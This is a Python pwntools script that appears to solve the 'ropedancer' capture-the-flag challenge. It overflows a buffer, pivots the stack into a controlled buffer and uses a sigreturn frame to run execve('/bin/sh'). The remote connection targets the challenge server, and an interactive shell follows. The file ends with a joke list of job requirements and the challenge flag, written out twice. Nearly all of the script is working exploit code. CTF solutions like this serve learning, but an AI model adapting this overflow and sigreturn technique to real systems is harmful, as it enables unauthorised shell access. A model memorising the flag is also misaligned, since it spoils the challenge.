#!/usr/bin/env python3

from pwn import *

p64 = lambda x: util.packing.p64(x, endian='little')
u64 = lambda x: util.packing.u64(x, endian='little')
p32 = lambda x: util.packing.p32(x, endian='little')
u32 = lambda x: util.packing.u32(x, endian='little')

exe = ELF("./ropedancer_patched")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


def conn():
	if args.LOCAL:
		r = process([exe.path])
	elif args.REMOTE:
		r = remote("static-03.herocft.fr", 5002)
	else:
		r = gdb.debug([exe.path])
	return r


motivation_letter = exe.symbols['motivation_letter']
bin_sh = motivation_letter

mov_rsp_rbp = 0x0000000000401114 # mov rsp, rbp; pop rbp; ret;
syscall = 0x000000000040102f # syscall;
xor_inc_rax = 0x0000000000401011 # xor eax, eax; inc al; ret
inc_rax = 0x0000000000401013 # inc al; ret;

def main():
	r = conn()

	offset = 16

	payload = b''.join([
		b'A' * offset,
		p64(motivation_letter),
		p64(mov_rsp_rbp),
	])

	r.sendlineafter(b'ROPedancer? ', b'yes')
	r.sendlineafter(b'contact you: ', payload)

	frame = SigreturnFrame()
	frame.rax = 0x3B # syscall for execve
	frame.rdi = bin_sh
	frame.rsi = 0x0
	frame.rdx = 0x0
	frame.rip = syscall

	payload = b''.join([
		b'/bin/sh\x00',
		p64(xor_inc_rax),
		p64(inc_rax) * 14,
		p64(syscall), # sigreturn is 15 so we set rax
		bytes(frame),
	])

	r.sendlineafter(b'hire you: ', payload)

	r.interactive()


if __name__ == "__main__":
	main()


'''
- Must be able to balance on a tightrope while wearing clown shoes and juggling flaming rubber chickens
- Able to perform tightrope tricks while reciting Shakespearean sonnets in pig Latin
- Must possess the unique ability to hypnotize audiences using only the power of interpretative dance while on a tightrope
- Capable of performing the entire "Thriller" dance routine from Michael Jackson on a tightrope, while also dressed as a zombie
- Exceptional at tightrope walking while wearing a blindfold and navigating solely by echolocation, like a bat
- Must be able to tightrope walk while simultaneously making balloon animals for an audience of highly discerning squirrels
- Proficient in tightrope walking while wearing a sumo wrestler suit and maintaining perfect balance, even in strong winds
- Able to balance on a tightrope while holding a tray of delicate teacups, ensuring not a single drop of tea is spilled
- Expert in tightrope walking while solving a Rubik's Cube, playing the accordion, and wearing a full suit of medieval armor while screaming "Hero{1_w4nN4_b3_4_R0P3_D4nC3r_s0_b4d!!!}"
- Must be able to recite the entire periodic table of elements backwards, while walking on a tightrope suspended over a pool of hungry alligators
'''

# Hero{1_w4nN4_b3_4_R0P3_D4nC3r_s0_b4d!!!}
